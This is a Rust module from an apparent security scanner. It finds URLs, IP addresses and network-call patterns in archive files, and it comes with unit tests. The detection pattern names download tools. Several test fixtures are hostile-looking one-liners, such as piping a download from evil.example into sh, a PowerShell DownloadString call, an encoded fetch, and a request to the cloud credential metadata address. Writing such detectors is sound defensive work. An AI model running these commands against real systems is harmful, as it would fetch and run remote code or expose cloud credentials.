//! Finds network addresses in a file, and code that looks like a network call.
//!
//! This reads text patterns and doesn't understand the code. It sees addresses
//! written out as plain text, and a call on the same line as an address counts
//! as a call to it. It will miss anything encoded or split up, which is why
//! calls with no visible address get their own section in the report.

use crate::archive::ArchiveFile;
use crate::report::{At, Kind, Report};
use crate::text::Untrusted;
use regex::bytes::Regex;
use std::net::{Ipv4Addr, Ipv6Addr};
use std::ops::Range;
use std::sync::LazyLock;

/// A slash may be written `\/` because JSON and minified code often escape it.
const URL_PATTERN: &str = r#"(?i-u)\b(?:https?|wss?|ftps?|sftp|ssh|git|tcp|udp|smb|ldaps?|rtsp|mqtts?|amqps?|redis|mongodb(?:\+srv)?|postgres(?:ql)?|mysql|telnet):(?:\\?/){2}(?:\[[0-9a-f:.]+\]|[^\x00-\x20\x7f"'`<>()\[\]\\|^,;]|\\/)+"#;

const IPV4_PATTERN: &str = r"(?-u)\b(?:\d{1,3}\.){3}\d{1,3}\b";

// `fetch` must have an argument, which skips unrelated methods like
// `$output->fetch()`. Command names must be followed by something that looks
// like an argument, which skips prose like "with curl or wget".
const CALL_PATTERN: &str = r#"(?xi-u)
    \b(?:
        fetch\s*\([^)\s]
      | axios(?:\.\w+)?\s*\(
      | got\.(?:get|post|put|stream)\s*\(
      | https?\.(?:get|post|head|request|newrequest(?:withcontext)?)\s*\(
      | http::(?:get|post|put|patch|delete|head)\s*\(
      | requests\.(?:get|post|put|patch|delete|head|request)\s*\(
      | httpx\.(?:get|post|put|patch|delete|head|request|stream)\s*\(
      | url(?:open|retrieve)\s*\(
      | reqwest::(?:get|client|blocking)
      | ureq::(?:get|post|put|request|agent)
      | net::http
      | xmlhttprequest
      | websocket\s*\(
      | sendbeacon\s*\(
      | eventsource\s*\(
      | socket\.(?:connect|create_connection)\s*\(
      | net\.(?:dial|connect|createconnection)\s*\(
      | tls\.(?:dial|connect)\s*\(
      | open(?:connection|stream)\s*\(
      | curl_(?:init|exec)\s*\(
      | (?:curl|wget|iwr|irm)\s+(?:[-"'$%@{`<]|[\w.-]+[.:/]\w)
      | invoke-(?:webrequest|restmethod)
      | download(?:string|file|data)\s*\(
      | start-bitstransfer
      | bitsadmin
      | certutil\s+-urlcache
      | new\s+(?:http|web)client
      | urlsession
    )
"#;

static URL: LazyLock<Regex> = LazyLock::new(|| compile(URL_PATTERN));
static IPV4: LazyLock<Regex> = LazyLock::new(|| compile(IPV4_PATTERN));
static CALL: LazyLock<Regex> = LazyLock::new(|| compile(CALL_PATTERN));

fn compile(pattern: &str) -> Regex {
    Regex::new(pattern).expect("patterns are constants covered by tests")
}

/// How far either side of a match to look for a related call or address.
const NEARBY_BYTES: usize = 120;
/// Git treats a file as binary if its first 8000 bytes contain a zero byte.
const BINARY_CHECK_BYTES: usize = 8000;
const HOST_BUILT_AT_RUN_TIME: &str = "(host is built at run time)";

/// Cloud servers hand out credentials at this address, so code reaching for it
/// is notable even though it isn't on the public internet.
const CLOUD_METADATA_HOSTS: [&str; 3] = [
    "169.254.169.254",
    "metadata.google.internal",
    "[fd00:ec2::254]",
];

const LOCKFILES: [&str; 14] = [
    "bun.lock",
    "cargo.lock",
    "composer.lock",
    "flake.lock",
    "gemfile.lock",
    "go.sum",
    "mix.lock",
    "npm-shrinkwrap.json",
    "package-lock.json",
    "pipfile.lock",
    "pnpm-lock.yaml",
    "poetry.lock",
    "uv.lock",
    "yarn.lock",
];
const DOCUMENT_EXTENSIONS: [&str; 5] = [".adoc", ".markdown", ".md", ".mdx", ".rst"];
const DOCUMENT_NAMES: [&str; 6] = [
    "authors",
    "changelog",
    "copying",
    "licence",
    "license",
    "notice",
];

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum FileClass {
    Documentation,
    Lockfile,
    Code,
}

/// Records every address and network call in a file.
pub fn scan(file: &ArchiveFile, report: &mut Report) {
    let class = classify(file.path.raw());
    let binary = is_binary(&file.contents);

    scan_urls(file, class, binary, report);
    // Version numbers in lockfiles look exactly like IP addresses.
    if class != FileClass::Lockfile {
        scan_ips(file, class, binary, report);
    }
    if class == FileClass::Code && !binary {
        scan_calls(file, report);
    }
}

fn scan_urls(file: &ArchiveFile, class: FileClass, binary: bool, report: &mut Report) {
    let contents = file.contents.as_slice();
    let mut lines = LineCounter::new(contents, binary);

    for found in URL.find_iter(contents) {
        let url = clean_url(found.as_bytes());
        let Some(host) = host_of(&url) else {
            continue;
        };
        let call = is_near_call(contents, found.start(), found.end());
        let kind = address_kind(class, &host, call);
        let group = if is_built_at_run_time(&host) {
            HOST_BUILT_AT_RUN_TIME
        } else {
            host.as_str()
        };
        let line = lines.line_at(found.start());
        report.add(
            kind,
            group,
            &url,
            Some(At {
                path: &file.path,
                line,
            }),
        );
    }
}

fn scan_ips(file: &ArchiveFile, class: FileClass, binary: bool, report: &mut Report) {
    let contents = file.contents.as_slice();
    let mut lines = LineCounter::new(contents, binary);

    for found in IPV4.find_iter(contents) {
        if !stands_alone(contents, found.start(), found.end()) {
            continue;
        }
        let text = String::from_utf8_lossy(found.as_bytes());
        if text.parse::<Ipv4Addr>().is_err() {
            continue;
        }
        let call = is_near_call(contents, found.start(), found.end());
        let kind = address_kind(class, &text, call);
        let line = lines.line_at(found.start());
        report.add(
            kind,
            "",
            &text,
            Some(At {
                path: &file.path,
                line,
            }),
        );
    }
}

/// Lists calls with no address beside them. These matter most when nothing else
/// shows up, because `fetch(atob("..."))` leaves no address to find.
fn scan_calls(file: &ArchiveFile, report: &mut Report) {
    let contents = file.contents.as_slice();
    let mut lines = LineCounter::new(contents, false);

    for found in CALL.find_iter(contents) {
        let nearby = surrounding_line(contents, found.start(), found.end());
        if URL.is_match(nearby) || IPV4.is_match(nearby) {
            continue;
        }
        let snippet = Untrusted::from_bytes(nearby.trim_ascii());
        let line = lines.line_at(found.start());
        report.add(
            Kind::CallWithoutAddress,
            "",
            snippet.raw(),
            Some(At {
                path: &file.path,
                line,
            }),
        );
    }
}

fn address_kind(class: FileClass, host: &str, near_call: bool) -> Kind {
    match class {
        FileClass::Documentation => Kind::DocumentationAddress,
        FileClass::Lockfile => Kind::LockfileAddress,
        FileClass::Code if is_local(host) => Kind::LocalAddress,
        FileClass::Code if near_call => Kind::NetworkCall,
        FileClass::Code if is_ip(host) => Kind::IpAddress,
        FileClass::Code => Kind::MentionedAddress,
    }
}

/// Only sorts findings into sections, so a wrong guess can't hide anything. The
/// checks are narrow because a script named `license.js` is not documentation.
fn classify(path: &str) -> FileClass {
    let lower = path.to_ascii_lowercase();
    let name = lower.rsplit('/').next().unwrap_or(&lower);

    if LOCKFILES.contains(&name) {
        return FileClass::Lockfile;
    }
    let document_extension = DOCUMENT_EXTENSIONS.iter().any(|ext| name.ends_with(ext));
    let document_name = DOCUMENT_NAMES.iter().any(|known| name.starts_with(known));
    let readme_or_notice = document_name && (!name.contains('.') || name.ends_with(".txt"));

    if document_extension || readme_or_notice {
        FileClass::Documentation
    } else {
        FileClass::Code
    }
}

fn is_binary(contents: &[u8]) -> bool {
    contents[..contents.len().min(BINARY_CHECK_BYTES)].contains(&0)
}

/// Normalizes a raw match into the URL it most likely represents.
fn clean_url(raw: &[u8]) -> String {
    let untrusted = Untrusted::from_bytes(raw);
    let mut url = untrusted.raw().replace("\\/", "/");

    loop {
        let trimmed = url.trim_end_matches(['.', ':', '!', '?', '*', '_', '~', '=', '+', '&', '#']);
        let open = trimmed.matches('{').count();
        let close = trimmed.matches('}').count();
        let without_brace = trimmed.strip_suffix('}').filter(|_| close > open);
        let next = without_brace.unwrap_or(trimmed).to_string();
        if next.len() == url.len() {
            return url;
        }
        url = next;
    }
}

/// The host a URL really points at, as opposed to the one it may appear to.
/// In `https://bank.example@evil.example/` the host is `evil.example`.
fn host_of(url: &str) -> Option<String> {
    let (_, rest) = url.split_once("://")?;
    let authority = rest.split(['/', '?', '#']).next()?;
    let host_and_port = authority
        .rsplit_once('@')
        .map_or(authority, |(_, after)| after);

    let host = if host_and_port.starts_with('[') {
        match host_and_port.find(']') {
            Some(end) => &host_and_port[..=end],
            None => host_and_port,
        }
    } else {
        match host_and_port.rsplit_once(':') {
            Some((before, port)) if port.bytes().all(|byte| byte.is_ascii_digit()) => before,
            _ => host_and_port,
        }
    };

    (!host.is_empty()).then(|| host.to_lowercase())
}

fn is_built_at_run_time(host: &str) -> bool {
    host.contains(['$', '{', '}', '%', '*'])
}

fn is_ip(host: &str) -> bool {
    host.parse::<Ipv4Addr>().is_ok() || parse_ipv6(host).is_some()
}

fn parse_ipv6(host: &str) -> Option<Ipv6Addr> {
    host.strip_prefix('[')?.strip_suffix(']')?.parse().ok()
}

/// Whether an address stays on the machine or local network, or can't be routed
/// at all. Listed separately because it isn't an outside connection.
fn is_local(host: &str) -> bool {
    if CLOUD_METADATA_HOSTS.contains(&host) {
        return false;
    }
    if host == "localhost"
        || host.ends_with(".localhost")
        || host.ends_with(".local")
        || host.ends_with(".internal")
    {
        return true;
    }
    if let Ok(ip) = host.parse::<Ipv4Addr>() {
        let [first, ..] = ip.octets();
        return ip.is_loopback()
            || ip.is_private()
            || ip.is_link_local()
            || ip.is_documentation()
            || first == 0
            || first >= 224;
    }
    if let Some(ip) = parse_ipv6(host) {
        return ip.is_loopback()
            || ip.is_unspecified()
            || ip.is_unique_local()
            || ip.is_unicast_link_local();
    }
    false
}

/// Rules out numbers that are part of something longer, such as `pkg-1.2.3.4`
/// or `1.2.3.4.5`. The `/` also skips hosts the URL search already listed.
fn stands_alone(contents: &[u8], start: usize, end: usize) -> bool {
    let before = start.checked_sub(1).map(|at| contents[at]);
    let after = contents.get(end).copied();
    let after_next = contents.get(end + 1).copied();

    let joined_before = matches!(before, Some(b'.' | b'-' | b'_' | b'/' | b'@' | b'~' | b'^'));
    let joined_after = matches!(after, Some(b'-' | b'_'))
        || (after == Some(b'.') && after_next.is_some_and(|byte| byte.is_ascii_digit()));

    !joined_before && !joined_after
}

/// Whether a call sits beside an address. The address is masked first, so a link
/// that merely contains a word like `XMLHttpRequest` doesn't count as a call.
fn is_near_call(contents: &[u8], start: usize, end: usize) -> bool {
    let line = surrounding_range(contents, start, end);
    let mut masked = contents[line.start..start].to_vec();
    masked.push(b'"');
    masked.extend_from_slice(&contents[end..line.end]);
    CALL.is_match(&masked)
}

fn surrounding_line(contents: &[u8], start: usize, end: usize) -> &[u8] {
    &contents[surrounding_range(contents, start, end)]
}

/// The part of the line around a match, kept short because one line of minified
/// code can be megabytes long.
fn surrounding_range(contents: &[u8], start: usize, end: usize) -> Range<usize> {
    let from = start.saturating_sub(NEARBY_BYTES);
    let to = end.saturating_add(NEARBY_BYTES).min(contents.len());

    let line_start = contents[from..start]
        .iter()
        .rposition(|byte| *byte == b'\n')
        .map_or(from, |newline| from + newline + 1);
    let line_end = contents[end..to]
        .iter()
        .position(|byte| *byte == b'\n')
        .map_or(to, |newline| end + newline);

    line_start..line_end
}

/// Works out line numbers for matches that arrive in order, without recounting
/// from the top of the file each time.
struct LineCounter<'a> {
    contents: &'a [u8],
    position: usize,
    line: u64,
    binary: bool,
}

impl<'a> LineCounter<'a> {
    fn new(contents: &'a [u8], binary: bool) -> Self {
        Self {
            contents,
            position: 0,
            line: 1,
            binary,
        }
    }

    fn line_at(&mut self, offset: usize) -> Option<u64> {
        if self.binary {
            return None;
        }
        let newlines = self.contents[self.position..offset]
            .iter()
            .filter(|byte| **byte == b'\n')
            .count();
        self.line += newlines as u64;
        self.position = offset;
        Some(self.line)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn scan_text(path: &str, contents: &[u8]) -> Report {
        let file = ArchiveFile {
            path: Untrusted::from_bytes(path.as_bytes()),
            contents: contents.to_vec(),
        };
        let mut report = Report::new();
        scan(&file, &mut report);
        report
    }

    fn subjects(report: &Report, kind: Kind) -> Vec<String> {
        report
            .listed(kind)
            .into_iter()
            .map(|(subject, _)| subject)
            .collect()
    }

    #[test]
    fn finds_addresses_in_many_protocols() {
        for url in [
            "http://a.example/x",
            "https://a.example/x?y=1&z=2#top",
            "HTTPS://A.example/x",
            "ws://a.example/socket",
            "wss://a.example/socket",
            "ftp://a.example/file",
            "ssh://git@a.example/repo",
            "tcp://a.example:9000",
            "redis://a.example:6379/0",
            "mongodb+srv://user:pw@a.example/db",
            "postgres://a.example/db",
        ] {
            let report = scan_text("config.yml", format!("x: {url}\n").as_bytes());

            assert_eq!(
                subjects(&report, Kind::MentionedAddress),
                [url],
                "input: {url}"
            );
        }
    }

    #[test]
    fn finds_addresses_escaped_for_json() {
        let report = scan_text("a.json", br#"{"u":"https:\/\/evil.example\/x"}"#);

        assert_eq!(
            subjects(&report, Kind::MentionedAddress),
            ["https://evil.example/x"]
        );
    }

    #[test]
    fn stops_at_the_end_of_the_address() {
        for (text, expected) in [
            ("see https://a.example/x.", "https://a.example/x"),
            ("(https://a.example/x)", "https://a.example/x"),
            ("[a](https://a.example/x)", "https://a.example/x"),
            ("\"https://a.example/x\",", "https://a.example/x"),
            ("<https://a.example/x>", "https://a.example/x"),
            ("{\"u\":\"https://a.example\"}", "https://a.example"),
            ("x = {https://a.example}", "https://a.example"),
            ("**https://a.example/x**", "https://a.example/x"),
            ("`https://${h}.example/${p}`", "https://${h}.example/${p}"),
        ] {
            let report = scan_text("a.yml", text.as_bytes());

            assert_eq!(
                subjects(&report, Kind::MentionedAddress),
                [expected],
                "input: {text}"
            );
        }
    }

    #[test]
    fn groups_by_the_real_host_not_the_one_it_appears_to_be() {
        for (url, host) in [
            ("https://bank.example@evil.example/x", "evil.example"),
            ("https://u:p@evil.example:8443/x", "evil.example"),
            ("https://EVIL.example/x", "evil.example"),
            ("https://evil.example?x=@bank.example", "evil.example"),
            ("http://[2001:4860::1]:80/x", "[2001:4860::1]"),
        ] {
            let report = scan_text("a.yml", format!("{url}\n").as_bytes());
            let kind = if host.starts_with('[') {
                Kind::IpAddress
            } else {
                Kind::MentionedAddress
            };

            assert_eq!(report.group_of(kind, url).as_deref(), Some(host), "{url}");
        }
    }

    #[test]
    fn a_host_built_at_run_time_is_labelled_as_such() {
        let url = "https://${HOST}/payload";
        let report = scan_text("a.js", format!("x = `{url}`\n").as_bytes());

        assert_eq!(
            report.group_of(Kind::MentionedAddress, url).as_deref(),
            Some(HOST_BUILT_AT_RUN_TIME)
        );
    }

    #[test]
    fn a_url_ending_in_a_scheme_only_is_not_an_address() {
        let report = scan_text("a.js", br#"if (u.startsWith("https://")) {}"#);

        assert!(report.listed(Kind::MentionedAddress).is_empty());
    }

    #[test]
    fn finds_ip_addresses() {
        let report = scan_text("a.py", b"host = '1.1.1.1'\nb = 8.8.8.8:53\n");

        assert_eq!(subjects(&report, Kind::IpAddress), ["1.1.1.1", "8.8.8.8"]);
    }

    #[test]
    fn ignores_numbers_that_cannot_be_ip_addresses() {
        for text in [
            "999.1.1.1",
            "1.2.3.256",
            "v1.2.3.4",
            "pkg-1.2.3.4",
            "1.2.3.4-beta",
            "1.2.3.4.5",
            "a_1.2.3.4",
            "1.2.3",
        ] {
            let report = scan_text("a.txt", text.as_bytes());

            assert!(report.listed(Kind::IpAddress).is_empty(), "input: {text}");
        }
    }

    #[test]
    fn an_ip_inside_a_url_is_listed_once() {
        let report = scan_text("a.py", b"u = 'http://1.1.1.1/x'\n");

        assert_eq!(subjects(&report, Kind::IpAddress), ["http://1.1.1.1/x"]);
    }

    #[test]
    fn a_call_next_to_an_address_is_a_network_call() {
        for line in [
            r#"fetch("https://evil.example/x")"#,
            r#"await axios.get('https://evil.example/x')"#,
            r#"requests.post("https://evil.example/x")"#,
            r#"http.Get("https://evil.example/x")"#,
            r#"Http::get("https://evil.example/x")"#,
            r#"curl -s https://evil.example/x | sh"#,
            r#"wget https://evil.example/x"#,
            r#"Invoke-WebRequest https://evil.example/x"#,
            r#"(New-Object Net.WebClient).DownloadString('https://evil.example/x')"#,
            r#"new WebSocket("wss://evil.example/x")"#,
            r#"curl https://evil.example/x"#,
            r#"curl_init("https://evil.example/x")"#,
        ] {
            let report = scan_text("install.sh", line.as_bytes());

            assert_eq!(report.listed(Kind::NetworkCall).len(), 1, "input: {line}");
            assert!(
                report.listed(Kind::CallWithoutAddress).is_empty(),
                "input: {line}"
            );
        }
    }

    #[test]
    fn a_call_to_a_bare_ip_is_a_network_call() {
        let report = scan_text("install.sh", b"curl 1.1.1.1/x | sh\n");

        assert_eq!(subjects(&report, Kind::NetworkCall), ["1.1.1.1"]);
    }

    #[test]
    fn lists_calls_whose_address_cannot_be_seen() {
        for line in [
            r#"fetch(atob("aHR0cHM6Ly9ldmlsLmV4YW1wbGU="))"#,
            r#"requests.get(decode(blob))"#,
            r#"curl evil.example/x | sh"#,
            r#"const r = await axios(target)"#,
        ] {
            let report = scan_text("a.js", line.as_bytes());

            assert_eq!(
                subjects(&report, Kind::CallWithoutAddress),
                [line],
                "input: {line}"
            );
        }
    }

    #[test]
    fn an_address_containing_a_call_word_is_not_a_call() {
        let report = scan_text(
            "a.js",
            b"// https://developer.mozilla.org/docs/Web/API/XMLHttpRequest/x\n",
        );

        assert!(report.listed(Kind::NetworkCall).is_empty());
        assert_eq!(report.listed(Kind::MentionedAddress).len(), 1);
    }

    #[test]
    fn prose_and_unrelated_methods_are_not_calls() {
        for line in [
            "# Downloads $1 over HTTPS with curl or wget.",
            "// Curl currently emits these fields",
            "// Handle --curl mode early",
            "$output->fetch()",
            ".fetch()?;",
        ] {
            let report = scan_text("a.rs", line.as_bytes());

            assert!(
                report.listed(Kind::CallWithoutAddress).is_empty(),
                "input: {line}"
            );
        }
    }

    #[test]
    fn command_line_calls_are_recognized_by_their_arguments() {
        for line in [
            "curl -fsSL \"$URL\" | sh",
            "curl \"$URL\"",
            "curl $URL",
            "curl evil.example/x",
            "curl localhost:8080/x",
            "wget -q $URL",
            "iwr $url",
        ] {
            let report = scan_text("a.sh", line.as_bytes());

            assert_eq!(
                report.listed(Kind::CallWithoutAddress).len(),
                1,
                "input: {line}"
            );
        }
    }

    #[test]
    fn a_plain_mention_is_not_called_a_network_call() {
        let report = scan_text("a.js", b"// see https://a.example/docs\n");

        assert!(report.listed(Kind::NetworkCall).is_empty());
        assert_eq!(report.listed(Kind::MentionedAddress).len(), 1);
    }

    #[test]
    fn a_call_far_away_on_a_long_minified_line_does_not_count() {
        let padding = "x".repeat(NEARBY_BYTES * 2);
        let text = format!("fetch(a);{padding}'https://a.example/x'");
        let report = scan_text("a.min.js", text.as_bytes());

        assert!(report.listed(Kind::NetworkCall).is_empty());
        assert_eq!(report.listed(Kind::MentionedAddress).len(), 1);
    }

    #[test]
    fn sorts_addresses_by_the_kind_of_file_they_are_in() {
        let url = b"https://a.example/x\n";

        for (path, kind) in [
            ("README.md", Kind::DocumentationAddress),
            ("docs/guide.rst", Kind::DocumentationAddress),
            ("LICENSE", Kind::DocumentationAddress),
            ("LICENSE-MIT", Kind::DocumentationAddress),
            ("Cargo.lock", Kind::LockfileAddress),
            ("web/package-lock.json", Kind::LockfileAddress),
            ("src/main.rs", Kind::MentionedAddress),
            ("package.json", Kind::MentionedAddress),
            ("requirements.txt", Kind::MentionedAddress),
            // These names must not make code look like documentation.
            ("license.js", Kind::MentionedAddress),
            ("changelog.py", Kind::MentionedAddress),
        ] {
            let report = scan_text(path, url);

            assert_eq!(report.listed(kind).len(), 1, "path: {path}");
        }
    }

    #[test]
    fn documentation_is_not_searched_for_calls_but_its_addresses_are_listed() {
        let report = scan_text("README.md", b"Run: curl -s https://a.example/i | sh\n");

        assert!(report.listed(Kind::CallWithoutAddress).is_empty());
        assert_eq!(report.listed(Kind::DocumentationAddress).len(), 1);
    }

    #[test]
    fn local_addresses_get_their_own_section() {
        for text in [
            "http://localhost:3000/x",
            "http://app.local/x",
            "http://127.0.0.1:8080/x",
            "10.0.0.5",
            "192.168.1.1",
            "http://[::1]:80/x",
            "0.0.0.0",
            "255.255.255.0",
            "192.0.2.10",
        ] {
            let report = scan_text("a.yml", format!("{text}\n").as_bytes());

            assert_eq!(report.listed(Kind::LocalAddress).len(), 1, "input: {text}");
        }
    }

    #[test]
    fn the_cloud_credentials_address_is_never_treated_as_merely_local() {
        let report = scan_text(
            "a.py",
            b"requests.get('http://169.254.169.254/latest/meta-data/')\n",
        );

        assert!(report.listed(Kind::LocalAddress).is_empty());
        assert_eq!(report.listed(Kind::NetworkCall).len(), 1);
    }

    #[test]
    fn lockfile_versions_are_not_listed_as_ip_addresses() {
        let report = scan_text(
            "Cargo.lock",
            b"version = \"1.2.3.4\"\nsource = \"https://evil.example/x\"\n",
        );

        assert!(report.listed(Kind::IpAddress).is_empty());
        assert!(report.listed(Kind::LocalAddress).is_empty());
        assert_eq!(report.listed(Kind::LockfileAddress).len(), 1);
    }

    #[test]
    fn reports_the_right_line_numbers() {
        let url = "https://a.example/x";
        let text = format!("one\ntwo\n{url}\nfour\n{url}\n");
        let report = scan_text("a.js", text.as_bytes());

        assert_eq!(report.first_line(Kind::MentionedAddress, url), Some(3));
        assert_eq!(
            report.listed(Kind::MentionedAddress),
            [(url.to_string(), 2)]
        );
    }

    #[test]
    fn finds_addresses_inside_binary_files_without_line_numbers() {
        let url = "https://evil.example/x";
        let mut contents = vec![0u8; 16];
        contents.extend_from_slice(url.as_bytes());
        contents.push(0);
        let report = scan_text("tool.bin", &contents);

        assert_eq!(subjects(&report, Kind::MentionedAddress), [url]);
        assert_eq!(report.first_line(Kind::MentionedAddress, url), None);
    }

    #[test]
    fn binary_files_are_not_searched_for_calls() {
        let report = scan_text("a.bin", b"\0\0fetch(x)\0");

        assert!(report.listed(Kind::CallWithoutAddress).is_empty());
    }

    #[test]
    fn hostile_bytes_do_not_panic() {
        for contents in [
            &b"https://\xff\xfe"[..],
            b"https://\xff\xfe/x",
            b"https://@",
            b"https://:",
            b"https://[",
            b"https://[]",
            b"http://?",
            b"fetch(\xff\xfe",
            b"\xff.\xff.\xff.\xff",
            b"",
        ] {
            scan_text("a.js", contents);
        }
        let huge = format!("https://{}", "a".repeat(1024 * 1024));
        scan_text("a.js", huge.as_bytes());
    }
}
